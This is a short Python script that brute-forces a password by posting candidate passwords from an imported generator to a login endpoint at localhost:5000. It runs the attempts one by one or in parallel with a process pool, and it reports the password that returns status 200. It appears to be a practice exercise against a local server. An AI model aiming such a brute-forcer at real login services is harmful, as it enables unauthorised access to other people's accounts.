import requests
import simplejson as json
from hacker_script import password_generator
from multiprocessing import Pool, cpu_count



def req_server(password):
    jsonPass = json.dumps({'password': password})
    response = requests.post('http://localhost:5000/', json=jsonPass)
    if(response.status_code == 200):
            print('password found!')
    return response.status_code

def run_sequential():
    for password in password_generator():
        response = req_server(password)
        if (response == 200):
            print('correct password = ', password)
            


def run_parallel():
    passwords = []
    for password in password_generator():
            passwords.append(password)
    pool = Pool()
    pool.map(req_server, passwords)

